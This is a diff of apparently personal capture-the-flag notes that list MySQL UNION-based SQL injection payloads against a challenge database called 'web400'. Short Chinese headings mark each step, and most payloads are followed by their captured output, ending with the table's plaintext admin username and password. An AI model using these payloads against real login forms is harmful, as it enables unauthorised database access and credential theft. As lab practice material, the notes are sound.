@@ -1,15 +1,19 @@
 
 ' or (1) union select count(*) from information_schema.tables#
 ' or (1) union select user() from information_schema.tables#  root@localhost
-' or (1) union select database() from information_schema.tables#      web400
 admin' or (1) union select version() from information_schema.tables#          5.7.17-0ubuntu0.16.04.2
--- ' or (1) union select passwd() from information_schema.tables# 
-' or (1) union select 1,2,group_concat(table_name) from information_schema.tables where TABLE_SCHEMA='web400'
-
 ' or (1) union SELECT COUNT(*) FROM information_schema.SCHEMATA#          5
 
-' or (1) union SELECT table_name from information_schema.TABLES WHERE TABLE_SCHEMA = 'web400'#
-' or (1) union SELECT COLUMN_NAME from information_schema.COLUMNS WHERE TABLE_NAME = 'USERS'#   username password data
+看当前数据库
+' or (1) union select database()#      web400
+看数据库里的表
+' or (1) union select 1,2,group_concat(table_name) from information_schema.tables where TABLE_SCHEMA='web400'
+' or (1) union SELECT group_concat(table_name) from information_schema.TABLES WHERE TABLE_SCHEMA = 'web400'#
+
+看表里的列
+' or (1) union SELECT group_concat(COLUMN_NAME) from information_schema.COLUMNS WHERE TABLE_NAME = 'USERS'#   username password data
+
+看数据
 ' or (1) union SELECT password from web400.USERS#   zhegemimanigujicaibuchulai
 ' or (1) union SELECT username from web400.USERS#   admin
 ' or (1) union SELECT data from web400.USERS#   
